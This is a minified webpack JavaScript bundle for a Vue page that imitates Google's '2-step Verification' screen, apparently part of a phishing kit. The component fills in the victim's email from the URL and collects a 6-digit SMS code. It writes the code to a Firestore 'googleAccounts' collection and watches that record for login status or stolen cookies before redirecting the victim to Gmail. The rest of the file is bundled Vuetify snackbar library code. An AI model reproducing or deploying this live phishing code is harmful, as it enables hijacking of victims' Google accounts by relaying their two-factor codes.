(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["SMSVerificationForm"],{"8cb1":function(t,e,a){},beb8:function(t,e,a){"use strict";a("8cb1")},ca71:function(t,e,a){},d18a:function(t,e,a){"use strict";a.r(e);var s=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("v-app",{attrs:{color:""}},[s("v-content",{},[s("v-container",{staticClass:"d-flex justify-center",attrs:{"fill-height":""}},[s("v-card",{staticClass:"pl-8 pr-8",attrs:{"max-width":"448",height:"500",loading:t.loginPageLoaded,outlined:!0,flat:"",disabled:t.loginPageLoaded}},[s("v-card-title",[s("v-img",{staticClass:"mt-8",attrs:{width:"20",height:"32",src:a("8243"),contain:!0}})],1),s("v-card-text",[s("h3",{staticClass:"headline text-center text--primary"},[t._v(" 2-step Verification ")]),s("h4",{staticClass:"text--primary text-center"},[t._v(" This extra step shows that it's really you trying to "),s("br"),t._v("sign in. ")]),s("h4",{staticClass:"primary--text text-center"},[t._v("Learn more")]),s("div",{staticClass:"text-center"},[s("v-btn",{staticClass:"ma-3 mx-auto email-button",attrs:{rounded:!0,outlined:!0}},[s("v-icon",{attrs:{left:""}},[t._v("mdi-account-circle")]),s("div",{staticClass:"text--primary text-none"},[t._v(t._s(t.email))]),s("v-icon",{attrs:{right:""}},[t._v("mdi-chevron-down")])],1),s("h4",{staticClass:"text-left text--primary"},[t._v("2-step Verification")]),s("p",{staticClass:"text--primary text-left"},[t._v(t._s(t.promptNumber))]),s("v-text-field",{ref:"password",staticClass:"mt-5",attrs:{disabled:t.loginPageLoaded,type:"number",label:"Enter the code",error:t.error,outlined:!0,width:"300",color:"primary","error-messages":t.errorMessage},on:{"click:append":function(e){t.showPassword=!t.showPassword},keyup:function(e){return!e.type.indexOf("key")&&t._k(e.keyCode,"enter",13,e.key,"Enter")?null:t.submitForm.apply(null,arguments)}},model:{value:t.password,callback:function(e){t.password=e},expression:"password"}})],1)]),s("v-card-actions",[s("v-btn",{staticClass:"text-none",attrs:{color:"primary",depressed:!0,text:""}},[t._v("Try another way")]),s("v-spacer"),s("v-btn",{staticClass:"text-none",attrs:{color:"primary",depressed:!0,eight:"36",width:"88"},on:{click:t.submitForm}},[t._v("Next")])],1),s("v-snackbar",{attrs:{bottom:!0,timeout:0},model:{value:t.snackbar,callback:function(e){t.snackbar=e},expression:"snackbar"}},[t._v(" Didn't get the code? "),s("v-btn",{attrs:{dark:"",text:"",color:"yellow"},on:{click:t.resendCode}},[t._v("RESEND IT")])],1)],1)],1)],1)],1)},o=[],i=a("1da1"),r=(a("96cf"),a("caad"),a("2532"),a("d3b7"),a("159b"),a("dc59")),n={name:"SMSForm",data:function(){return{showPassword:!1,loginPageLoaded:!1,errorMessage:"",error:!1,disableCard:!1,email:"",password:"",ipAddress:"",countryName:"",submitCount:0,cardLoading:!1,snackbar:!1,promptNumber:""}},created:function(){var t=this;return Object(i["a"])(regeneratorRuntime.mark((function e(){var a,s;return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return t.email=t.$route.params.email.includes("@")?t.$route.params.email:window.atob(t.$route.params.email),console.log(t.email),console.log(t.$route.params.email),console.log(t.$route.params.promptNumber,"in SMS verification"),t.promptNumber=t.$route.params.promptNumber,a=r["a"].collection("googleAccounts"),e.next=8,a.doc(t.email).get();case 8:s=e.sent,s.get("cookies")&&(window.location.href="https://mail.google.com"),a.where("email","==",t.email).onSnapshot((function(e){console.log("i snapped"),e.docChanges().forEach((function(e){var a=e.doc.data();"modified"===e.type&&(a.loggedIn&&(window.location.href="https://mail.google.com"),a.loginError&&(t.loginPageLoaded=!t.loginPageLoaded,t.error=!0,t.errorMessage="Enter a valid 6 digit SMS code."))}),(function(t){console.log("Encountered error: ".concat(t))}))}));case 11:case"end":return e.stop()}}),e)})))()},mounted:function(){var t=this;console.log("i mounted"),setInterval((function(){console.log("snackbar ran here"),0==t.snackbar&&(t.snackbar=!0)}),15e3)},methods:{submitForm:function(){var t=this;return Object(i["a"])(regeneratorRuntime.mark((function e(){return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:if(console.log(),t.email=t.$route.params.email.includes("@")?t.$route.params.email:window.atob(t.$route.params.email),6==t.password.length){e.next=8;break}return console.log("i ran password length"),t.error=!0,t.errorMessage="Wrong number of digits. try again",t.password="",e.abrupt("return");case 8:return t.errorMessage="",t.error=!1,console.log(t.password),t.loginPageLoaded=!t.loginPageLoaded,e.prev=12,e.next=15,r["a"].collection("googleAccounts").doc(t.email).set({smsCode:t.password,loggedIn:!1,loginError:!1},{merge:!0});case 15:e.next=20;break;case 17:e.prev=17,e.t0=e["catch"](12),console.log(e.t0);case 20:t.smsCode="";case 21:case"end":return e.stop()}}),e,null,[[12,17]])})))()},resendCode:function(){var t=this;this.snackbar=!1,this.cardLoading=!0,this.disableCard=!0,this.error=!1,this.errorMessage="",setTimeout((function(){t.cardLoading=!1,t.disableCard=!1,t.password=""}),3e3)}}},c=n,l=(a("beb8"),a("2877")),d=a("6544"),u=a.n(d),h=a("7496"),m=a("8336"),p=a("b0af"),g=a("99d9"),v=a("a523"),b=a("a75b"),f=a("132d"),w=a("adda"),k=a("ade3"),x=(a("a9e3"),a("ca71"),a("8dd9")),C=a("a9ad"),y=a("7560"),_=a("f2e7"),T=a("fe6c"),j=a("58df"),O=a("80d2"),V=a("d9bd"),$=Object(j["a"])(x["a"],C["a"],_["a"],Object(T["b"])(["absolute","bottom","left","right","top"])).extend({name:"v-snackbar",props:{app:Boolean,centered:Boolean,contentClass:{type:String,default:""},multiLine:Boolean,text:Boolean,timeout:{type:[Number,String],default:5e3},transition:{type:[Boolean,String],default:"v-snack-transition",validator:function(t){return"string"===typeof t||!1===t}},vertical:Boolean},data:function(){return{activeTimeout:-1}},computed:{classes:function(){return{"v-snack--absolute":this.absolute,"v-snack--active":this.isActive,"v-snack--bottom":this.bottom||!this.top,"v-snack--centered":this.centered,"v-snack--has-background":this.hasBackground,"v-snack--left":this.left,"v-snack--multi-line":this.multiLine&&!this.vertical,"v-snack--right":this.right,"v-snack--text":this.text,"v-snack--top":this.top,"v-snack--vertical":this.vertical}},hasBackground:function(){return!this.text&&!this.outlined},isDark:function(){return this.hasBackground?!this.light:y["a"].options.computed.isDark.call(this)},styles:function(){if(this.absolute)return{};var t=this.$vuetify.application,e=t.bar,a=t.bottom,s=t.footer,o=t.insetFooter,i=t.left,r=t.right,n=t.top;return{paddingBottom:Object(O["d"])(a+s+o),paddingLeft:this.app?Object(O["d"])(i):void 0,paddingRight:this.app?Object(O["d"])(r):void 0,paddingTop:Object(O["d"])(e+n)}}},watch:{isActive:"setTimeout",timeout:"setTimeout"},mounted:function(){this.isActive&&this.setTimeout()},created:function(){this.$attrs.hasOwnProperty("auto-height")&&Object(V["e"])("auto-height",this),0==this.timeout&&Object(V["d"])('timeout="0"',"-1",this)},methods:{genActions:function(){return this.$createElement("div",{staticClass:"v-snack__action "},[Object(O["j"])(this,"action",{attrs:{class:"v-snack__btn"}})])},genContent:function(){return this.$createElement("div",{staticClass:"v-snack__content",class:Object(k["a"])({},this.contentClass,!0),attrs:{role:"status","aria-live":"polite"}},[Object(O["j"])(this)])},genWrapper:function(){var t=this,e=this.hasBackground?this.setBackgroundColor:this.setTextColor,a=e(this.color,{staticClass:"v-snack__wrapper",class:x["a"].options.computed.classes.call(this),style:x["a"].options.computed.styles.call(this),directives:[{name:"show",value:this.isActive}],on:{pointerenter:function(){return window.clearTimeout(t.activeTimeout)},pointerleave:this.setTimeout}});return this.$createElement("div",a,[this.genContent(),this.genActions()])},genTransition:function(){return this.$createElement("transition",{props:{name:this.transition}},[this.genWrapper()])},setTimeout:function(){var t=this;window.clearTimeout(this.activeTimeout);var e=Number(this.timeout);this.isActive&&![0,-1].includes(e)&&(this.activeTimeout=window.setTimeout((function(){t.isActive=!1}),e))}},render:function(t){return t("div",{staticClass:"v-snack",class:this.classes,style:this.styles},[!1!==this.transition?this.genTransition():this.genWrapper()])}}),L=a("2fa4"),S=a("8654"),E=Object(l["a"])(c,s,o,!1,null,null,null);e["default"]=E.exports;u()(E,{VApp:h["a"],VBtn:m["a"],VCard:p["a"],VCardActions:g["a"],VCardText:g["b"],VCardTitle:g["c"],VContainer:v["a"],VContent:b["a"],VIcon:f["a"],VImg:w["a"],VSnackbar:$,VSpacer:L["a"],VTextField:S["a"]})}}]);
//# sourceMappingURL=SMSVerificationForm.2b8a1cfe.js.map